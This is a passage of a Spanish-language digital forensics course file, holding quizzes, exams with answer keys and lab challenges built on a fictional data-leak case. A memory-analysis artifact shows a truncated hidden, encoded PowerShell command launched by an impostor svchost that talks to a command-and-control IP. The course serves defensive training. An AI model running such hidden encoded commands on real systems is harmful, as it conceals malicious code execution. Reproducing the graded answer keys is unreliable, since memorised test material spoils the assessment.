              { prompt: '¿Qué letra de unidad tuvo la USB?', answers: ['E', 'E:'], explanation: 'MountedDevices asocia E: a la Kingston; el acceso directo muestra vacaciones.jpg abierto desde E:.' },
              { prompt: '¿Qué programa de compresión se ejecutó minutos antes de conectar la USB? (nombre del ejecutable)', answers: ['7z.exe', '7z', '7-zip'], explanation: '7z.exe se ejecutó a las 00:11, se conectó la USB a las 00:14 y vacaciones.jpg (un ZIP disfrazado) se abrió desde E: a las 00:16. La secuencia apunta a que la base se comprimió, se disfrazó y se copió.' },
            ],
          },
        ]
      },
      {
        id: 'fdi_mobile',
        title: "6. Evidencia en Dispositivos Móviles",
        content: [
          { type: 'text', icon: 'AlarmIcon', text: "Un celular incautado debe aislarse de la red (modo avión o bolsa Faraday) para evitar borrados remotos o la llegada de datos nuevos. Su adquisición puede ser lógica (lo que expone el sistema), de sistema de archivos o física (copia completa, cuando el modelo lo permite)." },
          { type: 'text', icon: 'UserSearchIcon', text: "Las fotos suelen tener metadatos EXIF: fecha, modelo del equipo y, a veces, coordenadas GPS. Las copias de seguridad de aplicaciones de mensajería y los servicios en la nube pueden contener información que ya no está en el teléfono." },
          {
            type: 'memory',
            title: 'Asocie cada concepto móvil',
            pairs: [
              { term: 'Bolsa Faraday', definition: 'Aísla el teléfono de redes para evitar borrados remotos.' },
              { term: 'Adquisición lógica', definition: 'Extrae lo que el sistema operativo expone: contactos, mensajes, fotos.' },
              { term: 'Adquisición física', definition: 'Copia completa de la memoria, incluido lo borrado, cuando el modelo lo permite.' },
              { term: 'EXIF', definition: 'Metadatos de una foto: fecha, equipo y a veces ubicación GPS.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Llega un celular incautado y encendido. ¿Qué se hace primero?",
              options: [
                "Revisar los chats para ver si hay algo urgente.",
                "Aislarlo de las redes (modo avión o bolsa Faraday) y documentar su estado, para evitar borrados remotos.",
                "Reiniciarlo para que funcione más rápido durante el análisis."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: aislar evita borrados remotos y que lleguen datos nuevos que alteren la evidencia.",
                incorrect: "No. Navegar o reiniciar altera la evidencia; lo primero es aislarlo de la red y documentar su estado."
              }
            }
          },
        ]
      },
      {
        id: 'fdi_exam',
        title: "7. 📝 Examen del Nivel Intermedio",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "El examen toma 10 preguntas al azar de un banco de 14 y se aprueba con 70%. Al aprobarlo obtendrá el badge de Perito Forense Digital · Nivel Intermedio y se desbloqueará el Nivel Avanzado." },
          {
            type: 'exam',
            title: 'Examen: Perito Forense Digital · Intermedio',
            description: 'Evalúa adquisición, cadena de custodia, sistemas de archivos y firmas, artefactos de Windows y móviles.',
            passPercent: 70,
            questionsPerAttempt: 10,
            questions: [
              { question: 'Según el orden de volatilidad, ¿qué se recolecta antes?', options: [{ id: 'f1a', text: 'La memoria RAM.', isCorrect: true, score: 10 }, { id: 'f1b', text: 'El disco duro.', isCorrect: false, score: 0 }, { id: 'f1c', text: 'Las copias de seguridad.', isCorrect: false, score: 0 }], feedback: 'La RAM se pierde al apagar.' },
              { question: '¿Para qué sirve un bloqueador de escritura?', options: [{ id: 'f2a', text: 'Para leer un disco sin modificarlo.', isCorrect: true, score: 10 }, { id: 'f2b', text: 'Para borrar un disco de forma segura.', isCorrect: false, score: 0 }, { id: 'f2c', text: 'Para cifrar la evidencia.', isCorrect: false, score: 0 }], feedback: 'Garantiza que el original no cambie.' },
              { question: 'Un portátil encendido tiene el disco cifrado. ¿Qué riesgo hay si se apaga?', options: [{ id: 'f3a', text: 'Que el contenido quede inaccesible sin la clave.', isCorrect: true, score: 10 }, { id: 'f3b', text: 'Ninguno: el cifrado se quita al apagar.', isCorrect: false, score: 0 }, { id: 'f3c', text: 'Que el disco se borre solo.', isCorrect: false, score: 0 }], feedback: 'Encendido, el contenido está descifrado y accesible.' },
              { question: '¿Qué diferencia una imagen forense de copiar archivos con el explorador?', options: [{ id: 'f4a', text: 'La imagen copia bit a bit, incluido lo borrado y el espacio libre.', isCorrect: true, score: 10 }, { id: 'f4b', text: 'Ninguna: son iguales.', isCorrect: false, score: 0 }, { id: 'f4c', text: 'La imagen solo copia los documentos.', isCorrect: false, score: 0 }], feedback: 'La copia lógica pierde lo borrado y metadatos.' },
              { question: 'En la cadena de custodia, una persona entrega la evidencia sin que conste que la recibió. ¿Qué significa?', options: [{ id: 'f5a', text: 'Hay un tramo sin documentar que compromete la evidencia.', isCorrect: true, score: 10 }, { id: 'f5b', text: 'Es un error menor sin consecuencias.', isCorrect: false, score: 0 }, { id: 'f5c', text: 'Que la evidencia está más segura.', isCorrect: false, score: 0 }], feedback: 'Cada traspaso debe quedar registrado.' },
              { question: 'El hash de una imagen no coincide con el registrado al adquirirla. ¿Qué indica?', options: [{ id: 'f6a', text: 'Que la imagen fue alterada o no es la misma.', isCorrect: true, score: 10 }, { id: 'f6b', text: 'Que el hash caducó.', isCorrect: false, score: 0 }, { id: 'f6c', text: 'Que hay que usar otro algoritmo hasta que coincida.', isCorrect: false, score: 0 }], feedback: 'El hash solo cambia si cambian los datos.' },
              { question: '¿Por qué se puede recuperar un archivo borrado?', options: [{ id: 'f7a', text: 'Porque su espacio se marca como libre pero el contenido sigue hasta que se sobrescribe.', isCorrect: true, score: 10 }, { id: 'f7b', text: 'Porque Windows nunca borra nada.', isCorrect: false, score: 0 }, { id: 'f7c', text: 'Porque la papelera guarda todo para siempre.', isCorrect: false, score: 0 }], feedback: 'Por eso importa adquirir cuanto antes.' },
              { question: 'Un archivo "informe.pdf" empieza por los bytes 4D 5A. ¿Qué es?', options: [{ id: 'f8a', text: 'Un ejecutable de Windows disfrazado.', isCorrect: true, score: 10 }, { id: 'f8b', text: 'Un PDF normal.', isCorrect: false, score: 0 }, { id: 'f8c', text: 'Una imagen JPEG.', isCorrect: false, score: 0 }], feedback: 'MZ (4D 5A) es la firma de los ejecutables.' },
              { question: '¿Qué firma tienen los archivos ZIP y los documentos DOCX/XLSX?', options: [{ id: 'f9a', text: '50 4B 03 04 ("PK").', isCorrect: true, score: 10 }, { id: 'f9b', text: 'FF D8 FF.', isCorrect: false, score: 0 }, { id: 'f9c', text: '25 50 44 46.', isCorrect: false, score: 0 }], feedback: 'Los documentos de Office modernos son contenedores ZIP.' },
              { question: '¿Qué artefacto de Windows registra los programas ejecutados y su última ejecución?', options: [{ id: 'f10a', text: 'Prefetch.', isCorrect: true, score: 10 }, { id: 'f10b', text: 'La papelera de reciclaje.', isCorrect: false, score: 0 }, { id: 'f10c', text: 'El fondo de pantalla.', isCorrect: false, score: 0 }], feedback: 'Prefetch ayuda a demostrar ejecución de programas.' },
              { question: '¿Dónde quedan registradas las memorias USB conectadas a un equipo Windows?', options: [{ id: 'f11a', text: 'En el registro, en la clave USBSTOR.', isCorrect: true, score: 10 }, { id: 'f11b', text: 'En el historial del navegador.', isCorrect: false, score: 0 }, { id: 'f11c', text: 'En ningún lado.', isCorrect: false, score: 0 }], feedback: 'USBSTOR guarda fabricante, modelo y número de serie.' },
              { question: 'Un acceso directo (.lnk) apunta a un archivo en la unidad E:. ¿Qué puede demostrar?', options: [{ id: 'f12a', text: 'Que ese archivo se abrió desde un medio externo, aunque ya no esté conectado.', isCorrect: true, score: 10 }, { id: 'f12b', text: 'Nada: los accesos directos no guardan rutas.', isCorrect: false, score: 0 }, { id: 'f12c', text: 'Que el archivo fue borrado.', isCorrect: false, score: 0 }], feedback: 'Los LNK conservan la ruta y datos del volumen.' },
              { question: '¿Qué se hace primero con un celular incautado encendido?', options: [{ id: 'f13a', text: 'Aislarlo de las redes y documentar su estado.', isCorrect: true, score: 10 }, { id: 'f13b', text: 'Revisar los chats.', isCorrect: false, score: 0 }, { id: 'f13c', text: 'Restablecerlo de fábrica.', isCorrect: false, score: 0 }], feedback: 'Evita borrados remotos y cambios.' },
              { question: '¿Qué pueden revelar los metadatos EXIF de una foto?', options: [{ id: 'f14a', text: 'Fecha, modelo del equipo y, a veces, ubicación GPS.', isCorrect: true, score: 10 }, { id: 'f14b', text: 'La contraseña del teléfono.', isCorrect: false, score: 0 }, { id: 'f14c', text: 'Los mensajes de WhatsApp.', isCorrect: false, score: 0 }], feedback: 'EXIF puede ubicar una foto en tiempo y lugar.' },
            ],
          },
        ]
      },
    ]
  },
  forensic_avanzado: {
    title: "Perito Forense Digital · Nivel Avanzado",
    description: "Análisis de memoria RAM, líneas de tiempo, técnicas antiforenses, evidencia en la nube y el dictamen pericial, con un caso integrador de fuga de información. Examen con nota mínima del 80%.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'fda_intro',
        title: "1. 🎯 Nivel Avanzado: Análisis Profundo y Dictamen",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "En este nivel analizará lo que no se ve a simple vista: procesos en memoria, rastros que el sospechoso intentó borrar y eventos dispersos en la nube. Y aprenderá a convertir el análisis en un dictamen que resista el juicio." },
          { type: 'text', icon: 'AlarmIcon', text: "El examen final toma 12 preguntas al azar de un banco de 16 y exige 80%. Al aprobarlo obtendrá el badge de Perito Forense Digital · Nivel Avanzado." },
        ]
      },
      {
        id: 'fda_memory',
        title: "2. 🚩 Laboratorio: Análisis de Memoria RAM",
        content: [
          { type: 'text', icon: 'BrainCircuitIcon', text: "La memoria muestra el sistema \"en vivo\": procesos, conexiones de red, comandos ejecutados y código inyectado que quizá nunca tocó el disco. Volatility 3 es la herramienta abierta de referencia; sus complementos windows.pslist, windows.pstree, windows.netscan, windows.cmdline y windows.malfind son el punto de partida." },
          { type: 'text', icon: 'BugIcon', text: "Una pista clásica: en Windows, el proceso svchost.exe legítimo es hijo de services.exe. Un svchost.exe con otro padre, o ejecutándose desde una carpeta distinta de System32, merece atención." },
          {
            type: 'challenge',
            title: 'El proceso impostor',
            brief: "Se capturó la memoria del portátil ficticio del caso de fuga de información. Analice la salida de Volatility y encuentre el proceso malicioso.",
            artifacts: [
              {
                name: 'windows.pstree.txt',
                content: `PID    PPID   Proceso          Ruta
4      0      System
612    4      smss.exe         \\SystemRoot\\System32\\smss.exe
788    680    services.exe     C:\\Windows\\System32\\services.exe
904    788    svchost.exe      C:\\Windows\\System32\\svchost.exe
1180   788    svchost.exe      C:\\Windows\\System32\\svchost.exe
3320   3108   explorer.exe     C:\\Windows\\explorer.exe
5112   3320   svchost.exe      C:\\Users\\cvargas\\AppData\\Roaming\\svchost.exe
5208   5112   powershell.exe   C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`,
              },
              {
                name: 'windows.netscan.txt',
                content: `Proto  Local                 Remota               Estado        PID   Proceso
TCPv4  10.0.0.15:49812       198.51.100.10:443    ESTABLISHED   1180  svchost.exe
TCPv4  10.0.0.15:49855       203.0.113.200:8443   ESTABLISHED   5112  svchost.exe`,
              },
              {
                name: 'windows.cmdline.txt',
                content: `PID   Línea de comandos
5112  "C:\\Users\\cvargas\\AppData\\Roaming\\svchost.exe" -k netsvc
5208  powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...`,
              },
            ],
            questions: [
              { prompt: '¿Cuál es el PID del svchost.exe malicioso?', answers: ['5112'], hint: 'Fíjese en el padre (PPID) y en la ruta de cada svchost.exe.', explanation: 'El PID 5112 es hijo de explorer.exe (no de services.exe) y corre desde AppData\\Roaming: es un impostor.' },
              { prompt: '¿A qué dirección IP remota se conecta el proceso malicioso?', answers: ['203.0.113.200', '203.0.113.200:8443'], explanation: 'El PID 5112 mantiene una conexión con 203.0.113.200:8443, probablemente su servidor de comando y control.' },
              { prompt: '¿Qué proceso hijo lanzó el impostor? (nombre del ejecutable)', answers: ['powershell.exe', 'powershell'], explanation: 'Lanzó powershell.exe oculto (-W Hidden) con un comando codificado (-EncodedCommand): técnica típica para ejecutar código sin dejar rastro en disco.' },
            ],
          },
        ]
      },
      {
        id: 'fda_timeline',
        title: "3. 🚩 Laboratorio: La Súper Línea de Tiempo",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Una súper línea de tiempo (por ejemplo, con plaso/log2timeline) une en una sola cronología los eventos del sistema de archivos, el registro, los navegadores, los registros de eventos y la nube. Es la forma más clara de contar qué pasó, en orden y con su fuente." },
          {
            type: 'challenge',
            title: 'Reconstruya la noche del 2 de octubre',
            brief: "Esta es la línea de tiempo consolidada del caso ficticio de fuga de información. Responda con base en ella.",
            artifacts: [
              {
                name: 'supertimeline.csv',
                content: `fecha_hora (UTC-5)    fuente        evento
2026-10-02 23:41:05   Seguridad     Inicio de sesión · usuario=cvargas · tipo=2 (consola)
2026-10-02 23:47:30   Navegador     Descarga · factura_0921.pdf desde http://descargas.example/f.pdf
2026-10-02 23:48:02   Prefetch      Ejecución · FACTURA_0921.PDF (ejecutable)
2026-10-02 23:58:12   LNK           Apertura · C:\\Users\\cvargas\\Desktop\\clientes_2026.xlsx
2026-10-03 00:11:58   Prefetch      Ejecución · 7Z.EXE
2026-10-03 00:12:20   Sist. arch.   Creación · C:\\Users\\cvargas\\Pictures\\vacaciones.jpg (firma ZIP)
2026-10-03 00:14:51   USBSTOR       Conexión · Kingston DataTraveler (60A44C4136A2F1B0)
2026-10-03 00:16:40   LNK           Apertura · E:\\vacaciones.jpg
2026-10-03 00:19:33   Sist. arch.   Borrado · C:\\Users\\cvargas\\Desktop\\clientes_2026.xlsx
2026-10-03 00:21:02   Prefetch      Ejecución · CCLEANER64.EXE
2026-10-03 00:22:09   USBSTOR       Desconexión · Kingston DataTraveler`,
              },
            ],
            questions: [
              { prompt: '¿A qué hora se conectó la memoria USB? (HH:MM:SS)', answers: ['00:14:51'], explanation: 'La USB se conectó a las 00:14:51, después de crear el ZIP disfrazado y antes de abrirlo desde E:.' },
              { prompt: '¿Qué programa de limpieza se ejecutó para borrar rastros? (nombre del ejecutable)', answers: ['ccleaner64.exe', 'ccleaner64', 'ccleaner'], explanation: 'CCleaner a las 00:21: intento de borrar rastros. Aun así, Prefetch, LNK y USBSTOR conservaron la secuencia.' },
              { prompt: 'El tipo de inicio de sesión fue 2 (consola). ¿Qué sugiere: acceso presencial o remoto? (una palabra)', answers: ['presencial', 'local', 'fisico', 'físico'], explanation: 'El tipo 2 es un inicio interactivo en la consola: alguien estaba frente al equipo, lo que es relevante para la autoría.' },
            ],
          },
        ]
      },
      {
        id: 'fda_antiforensics',
        title: "4. Técnicas Antiforenses y Cómo Detectarlas",
        content: [
          { type: 'text', icon: 'LockIcon', text: "Las técnicas antiforenses buscan ocultar o destruir evidencia: borrado seguro (wiping), cambiar fechas de archivos (timestomping), cifrado, esteganografía, uso de navegadores en modo privado o sistemas que corren desde USB, y limpieza de registros." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "Casi siempre dejan huellas: el propio programa de limpieza aparece en Prefetch; en NTFS, las fechas de $STANDARD_INFORMATION (fáciles de alterar) pueden no coincidir con las de $FILE_NAME (más difíciles), lo que delata un timestomping; y los registros centralizados sobreviven al borrado local." },
          {
            type: 'flashcards',
            title: 'Técnica antiforense → cómo se detecta',
            cards: [
              { front: 'Timestomping', back: 'Comparar las fechas de $STANDARD_INFORMATION con las de $FILE_NAME en la $MFT: una discrepancia ilógica delata la manipulación.' },
              { front: 'Borrado de registros', back: 'El evento 1102 marca el borrado; los registros enviados a un sistema central conservan la copia.' },
              { front: 'Programas de limpieza', back: 'Su ejecución queda en Prefetch y su instalación en el registro; su uso, justo después del hecho, es en sí un indicio.' },
              { front: 'Archivos disfrazados', back: 'Comparar la extensión con la firma del archivo (número mágico).' },
              { front: 'Esteganografía', back: 'Tamaños anómalos, herramientas de esteganografía instaladas y análisis estadístico de las imágenes.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Un documento muestra fecha de creación en 2019 en $STANDARD_INFORMATION, pero $FILE_NAME indica que se creó en octubre de 2026. ¿Qué es lo más probable?",
              options: [
                "Que el reloj del equipo estaba mal en 2019.",
                "Que se manipularon las fechas (timestomping) para que el archivo pareciera antiguo.",
                "Que el archivo viajó en el tiempo."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: las herramientas de timestomping suelen modificar solo $STANDARD_INFORMATION; la discrepancia con $FILE_NAME las delata.",
                incorrect: "Lo más probable es una manipulación: $STANDARD_INFORMATION se altera fácilmente, $FILE_NAME no."
              }
            }
          },
        ]
      },
      {
        id: 'fda_cloud',
        title: "5. Evidencia en la Nube y en el Correo Corporativo",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Hoy gran parte de la evidencia no está en el equipo: está en el correo corporativo, en el almacenamiento en la nube y en los registros de auditoría de los servicios (inicios de sesión, descargas, archivos compartidos, reglas de buzón)." },
          { type: 'text', icon: 'AlarmIcon', text: "Esos registros tienen periodos de retención limitados según el servicio y el plan contratado: hay que exportarlos o solicitar su preservación pronto. Si los datos están en servidores de otro país, aplica la cooperación internacional que vio en la ruta de Investigador Cibercriminal." },
          {
            type: 'memory',
            title: 'Fuente en la nube → qué demuestra',
            pairs: [
              { term: 'Registro de inicios de sesión', definition: 'Quién entró, desde dónde y con qué dispositivo.' },
              { term: 'Auditoría de archivos compartidos', definition: 'Qué documentos se compartieron hacia afuera y con quién.' },
              { term: 'Auditoría del buzón', definition: 'Reglas de reenvío, correos borrados y accesos de terceros.' },
              { term: 'Historial de versiones', definition: 'Qué cambió en un documento y quién lo cambió.' },
            ]
          },
        ]
      },
      {
        id: 'fda_report',
        title: "6. El Dictamen Pericial",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "En Colombia, la Ley 906 de 2004 regula la prueba pericial (artículos 405 y siguientes): el perito presenta un informe que sirve de base a su opinión y lo sustenta oralmente en el juicio, donde puede ser interrogado y contrainterrogado." },
          { type: 'text', icon: 'CheckCircleIcon', text: "Un dictamen sólido identifica la evidencia y sus hashes, describe la metodología y las herramientas con su versión, presenta los hallazgos con su fuente, separa los hechos de las interpretaciones y declara las limitaciones. Debe poder reproducirlo otro perito." },
          {
            type: 'scenario',
            title: 'Caso 2: preparando el dictamen',
            intro: "Debe redactar el dictamen del caso ficticio de fuga de información. Cada decisión afecta su solidez. Necesita 50 de 60 puntos.",
            start: 'p1',
            maxPoints: 60,
            passPoints: 50,
            steps: {
              p1: {
                text: "¿Cómo redacta la conclusión principal?",
                choices: [
                  { text: "\"La evidencia muestra que, desde la sesión de consola del usuario cvargas, se comprimió clientes_2026.xlsx, se disfrazó como vacaciones.jpg y se abrió desde la USB de serie 60A44C4136A2F1B0.\"", next: 'p2', points: 20, feedback: "Excelente: hechos verificables, con su fuente, sin ir más allá de la evidencia." },
                  { text: "\"Carlos Vargas robó la base de datos para vendérsela a la competencia.\"", next: 'p2', points: -10, feedback: "La motivación y la venta no se desprenden de su evidencia; además, una sesión no identifica por sí sola a la persona." },
                ]
              },
              p2: {
                text: "La defensa podría cuestionar sus herramientas. ¿Qué incluye en la metodología?",
                choices: [
                  { text: "Nombre y versión de cada herramienta, los pasos seguidos, los hashes verificados y la posibilidad de reproducir el análisis.", next: 'p3', points: 20, feedback: "Correcto: la reproducibilidad es la mejor defensa del dictamen." },
                  { text: "Basta con decir \"se usaron herramientas forenses reconocidas\".", next: 'p3', points: 0, feedback: "Demasiado vago: no permite verificar ni reproducir." },
                ]
              },
              p3: {
                text: "No pudo recuperar el contenido del ZIP porque la USB nunca fue incautada. ¿Qué hace con ese vacío?",
                choices: [
                  { text: "Lo declaro en las limitaciones: se demostró la copia del archivo a la USB, pero no se pudo verificar el contenido final en ella.", next: 'fin', points: 20, feedback: "Bien: declarar las limitaciones fortalece la credibilidad del dictamen." },
                  { text: "Lo omito para que el dictamen se vea más contundente.", next: 'fin', points: -10, feedback: "Omitir limitaciones es un riesgo ético y procesal: la defensa lo descubrirá." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'fda_capstone',
        title: "7. 🧩 Caso Integrador: la Base de Datos que Salió de la Empresa",
        content: [
          { type: 'text', icon: 'SpyIcon', text: "Este caso integra todo: preservación, análisis de memoria y disco, línea de tiempo, nube y dictamen. Una empresa ficticia sospecha que un empleado que renunció se llevó la base de clientes." },
          {
            type: 'scenario',
            title: 'Caso integrador: el último día del empleado',
            intro: "El empleado renunció el viernes y el lunes un competidor contactó a varios clientes. Usted lidera el análisis forense. Necesita 80 de 100 puntos.",
            start: 'k1',
            maxPoints: 100,
            passPoints: 80,
            steps: {
              k1: {
                text: "TI quiere reasignar el portátil del exempleado a otra persona esta misma tarde. ¿Qué responde?",
                choices: [
                  { text: "Que no se toque: se preserva, se adquiere la imagen con hash y se abre la cadena de custodia antes de cualquier reasignación.", next: 'k2', points: 20, feedback: "Correcto: reinstalar el equipo destruiría la evidencia." },
                  { text: "Que lo reasignen, pero guardando una copia de la carpeta Documentos.", next: 'k2', points: -10, feedback: "Se perderían lo borrado, Prefetch, LNK y el registro." },
                ]
              },
              k2: {
                text: "El análisis muestra una USB conectada el último día y un archivo grande subido a un servicio de almacenamiento personal desde el navegador. ¿Qué fuentes adicionales pide?",
                choices: [
                  { text: "Los registros del proxy o firewall corporativo y la auditoría de la nube corporativa de ese día, para corroborar la subida con fuentes independientes.", next: 'k3', points: 20, feedback: "Bien: corroborar con fuentes independientes fortalece la conclusión." },
                  { text: "Ninguna: el historial del navegador es suficiente.", next: 'k3', points: 0, feedback: "Una sola fuente es más fácil de cuestionar." },
                ]
              },
              k3: {
                text: "El gerente le pide entrar a la cuenta personal de almacenamiento del exempleado, \"ya que la contraseña quedó guardada en el navegador\". ¿Qué hace?",
                choices: [
                  { text: "Me niego: acceder a una cuenta personal sin autorización ni orden judicial sería acceso abusivo y la prueba sería ilegal. Se solicita por la vía judicial.", next: 'k4', points: 20, feedback: "Correcto: la legalidad de la obtención es tan importante como el hallazgo." },
                  { text: "Entro solo para mirar, sin descargar nada.", next: 'k4', points: -20, feedback: "Sigue siendo acceso abusivo (Art. 269A de la Ley 1273) y contamina el caso." },
                ]
              },
              k4: {
                text: "Encuentra que el archivo de la base fue modificado con fechas de 2019, aunque la base se creó en 2026. ¿Cómo lo interpreta?",
                choices: [
                  { text: "Como posible timestomping: verifico $STANDARD_INFORMATION contra $FILE_NAME y busco la herramienta usada antes de concluir.", next: 'k5', points: 20, feedback: "Bien: se valida la hipótesis antes de afirmarla." },
                  { text: "Como prueba definitiva de que el empleado es culpable.", next: 'k5', points: 0, feedback: "Es un indicio que hay que verificar, no una conclusión automática." },
                ]
              },
              k5: {
                text: "¿Cómo presenta los resultados a la empresa?",
                choices: [
                  { text: "Dictamen con hallazgos verificables y sus fuentes, línea de tiempo, limitaciones y recomendaciones (control de USB, prevención de fuga de datos y procedimiento de retiro de empleados).", next: 'fin', points: 20, feedback: "Excelente cierre: hechos, límites y aprendizaje para la organización." },
                  { text: "Un correo diciendo que el empleado es culpable.", next: 'fin', points: -10, feedback: "Sin dictamen formal ni fuentes, la conclusión no tiene valor probatorio." },
                ]
              },
              fin: { text: "Fin del caso integrador. Si aprobó, está listo para el examen final." },
            }
          },
        ]
      },
      {
        id: 'fda_exam',
        title: "8. 📝 Examen del Nivel Avanzado",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Examen final de la ruta Perito Forense Digital: 12 preguntas al azar de un banco de 16, con 80% para aprobar." },
          {
            type: 'exam',
            title: 'Examen: Perito Forense Digital · Avanzado',
            description: 'Evalúa memoria RAM, líneas de tiempo, antiforense, nube y dictamen pericial.',
            passPercent: 80,
            questionsPerAttempt: 12,
            questions: [
              { question: '¿Qué puede revelar el análisis de memoria RAM que el disco quizá no muestre?', options: [{ id: 'g1a', text: 'Procesos activos, conexiones y código inyectado que nunca se escribió en disco.', isCorrect: true, score: 10 }, { id: 'g1b', text: 'Solo los archivos borrados.', isCorrect: false, score: 0 }, { id: 'g1c', text: 'Nada que no esté en el disco.', isCorrect: false, score: 0 }], feedback: 'El malware sin archivos vive solo en memoria.' },
              { question: 'En Windows, ¿de qué proceso es hijo un svchost.exe legítimo?', options: [{ id: 'g2a', text: 'De services.exe.', isCorrect: true, score: 10 }, { id: 'g2b', text: 'De explorer.exe.', isCorrect: false, score: 0 }, { id: 'g2c', text: 'De powershell.exe.', isCorrect: false, score: 0 }], feedback: 'Otro padre o una ruta fuera de System32 es sospechoso.' },
              { question: '¿Qué complemento de Volatility 3 lista las conexiones de red?', options: [{ id: 'g3a', text: 'windows.netscan.', isCorrect: true, score: 10 }, { id: 'g3b', text: 'windows.pslist.', isCorrect: false, score: 0 }, { id: 'g3c', text: 'windows.cmdline.', isCorrect: false, score: 0 }], feedback: 'pslist lista procesos y cmdline sus líneas de comandos.' },
              { question: '¿Por qué es sospechoso "powershell.exe -W Hidden -EncodedCommand …"?', options: [{ id: 'g4a', text: 'Ejecuta código oculto y codificado, una técnica común para evadir la detección.', isCorrect: true, score: 10 }, { id: 'g4b', text: 'Porque PowerShell siempre es malicioso.', isCorrect: false, score: 0 }, { id: 'g4c', text: 'No es sospechoso.', isCorrect: false, score: 0 }], feedback: 'PowerShell es legítimo; la forma de uso es lo sospechoso.' },
              { question: '¿Qué aporta una súper línea de tiempo?', options: [{ id: 'g5a', text: 'Une eventos de muchas fuentes en una sola cronología con su origen.', isCorrect: true, score: 10 }, { id: 'g5b', text: 'Borra los eventos repetidos.', isCorrect: false, score: 0 }, { id: 'g5c', text: 'Recupera contraseñas.', isCorrect: false, score: 0 }], feedback: 'Permite contar la historia en orden y con fuentes.' },
              { question: 'Un inicio de sesión de tipo 2 en Windows indica…', options: [{ id: 'g6a', text: 'Un inicio interactivo en la consola del equipo.', isCorrect: true, score: 10 }, { id: 'g6b', text: 'Un acceso por escritorio remoto.', isCorrect: false, score: 0 }, { id: 'g6c', text: 'Un servicio del sistema.', isCorrect: false, score: 0 }], feedback: 'El escritorio remoto es el tipo 10.' },
              { question: '¿Cómo se detecta un posible timestomping en NTFS?', options: [{ id: 'g7a', text: 'Comparando las fechas de $STANDARD_INFORMATION con las de $FILE_NAME.', isCorrect: true, score: 10 }, { id: 'g7b', text: 'Mirando el ícono del archivo.', isCorrect: false, score: 0 }, { id: 'g7c', text: 'No se puede detectar.', isCorrect: false, score: 0 }], feedback: '$FILE_NAME es más difícil de alterar.' },
              { question: 'Tras el hecho se ejecutó un programa de limpieza. ¿Qué valor tiene ese dato?', options: [{ id: 'g8a', text: 'Es un indicio de intento de ocultar rastros, y su ejecución queda registrada.', isCorrect: true, score: 10 }, { id: 'g8b', text: 'Ninguno: limpiar el equipo es normal.', isCorrect: false, score: 0 }, { id: 'g8c', text: 'Demuestra que no hubo delito.', isCorrect: false, score: 0 }], feedback: 'El momento de la ejecución es lo relevante.' },
              { question: '¿Por qué conviene preservar pronto los registros de auditoría en la nube?', options: [{ id: 'g9a', text: 'Porque tienen periodos de retención limitados y se eliminan.', isCorrect: true, score: 10 }, { id: 'g9b', text: 'Porque ocupan mucho espacio.', isCorrect: false, score: 0 }, { id: 'g9c', text: 'No hace falta: se guardan para siempre.', isCorrect: false, score: 0 }], feedback: 'La retención depende del servicio y del plan.' },
              { question: 'El gerente ofrece la contraseña guardada de la cuenta personal del exempleado. ¿Qué hace el perito?', options: [{ id: 'g10a', text: 'No accede: sin autorización u orden judicial sería acceso abusivo.', isCorrect: true, score: 10 }, { id: 'g10b', text: 'Accede solo para mirar.', isCorrect: false, score: 0 }, { id: 'g10c', text: 'Descarga todo rápido.', isCorrect: false, score: 0 }], feedback: 'La prueba obtenida ilegalmente puede ser excluida.' },
              { question: '¿Qué norma colombiana regula la prueba pericial en el proceso penal?', options: [{ id: 'g11a', text: 'La Ley 906 de 2004.', isCorrect: true, score: 10 }, { id: 'g11b', text: 'La Ley 1581 de 2012.', isCorrect: false, score: 0 }, { id: 'g11c', text: 'La Circular 36 de 2022.', isCorrect: false, score: 0 }], feedback: 'Desde el artículo 405.' },
              { question: '¿Qué debe incluir la metodología de un dictamen?', options: [{ id: 'g12a', text: 'Herramientas con versión, pasos, hashes y forma de reproducir el análisis.', isCorrect: true, score: 10 }, { id: 'g12b', text: 'Solo la conclusión.', isCorrect: false, score: 0 }, { id: 'g12c', text: 'La opinión personal del perito sobre el acusado.', isCorrect: false, score: 0 }], feedback: 'La reproducibilidad da solidez.' },
              { question: 'No pudo verificar un hallazgo porque falta una evidencia. ¿Qué hace en el dictamen?', options: [{ id: 'g13a', text: 'Lo declara como limitación.', isCorrect: true, score: 10 }, { id: 'g13b', text: 'Lo omite.', isCorrect: false, score: 0 }, { id: 'g13c', text: 'Lo supone cierto.', isCorrect: false, score: 0 }], feedback: 'Las limitaciones declaradas fortalecen la credibilidad.' },
              { question: 'Una sesión de usuario en un equipo, ¿identifica por sí sola a la persona?', options: [{ id: 'g14a', text: 'No: muestra una cuenta; la autoría requiere más elementos.', isCorrect: true, score: 10 }, { id: 'g14b', text: 'Sí, siempre.', isCorrect: false, score: 0 }, { id: 'g14c', text: 'Solo si la contraseña es larga.', isCorrect: false, score: 0 }], feedback: 'Otra persona pudo usar la cuenta.' },
              { question: '¿Por qué corroborar un hallazgo con fuentes independientes?', options: [{ id: 'g15a', text: 'Porque una conclusión respaldada por varias fuentes es más difícil de cuestionar.', isCorrect: true, score: 10 }, { id: 'g15b', text: 'Para alargar el informe.', isCorrect: false, score: 0 }, { id: 'g15c', text: 'No es necesario.', isCorrect: false, score: 0 }], feedback: 'Por ejemplo: navegador + proxy + auditoría en la nube.' },
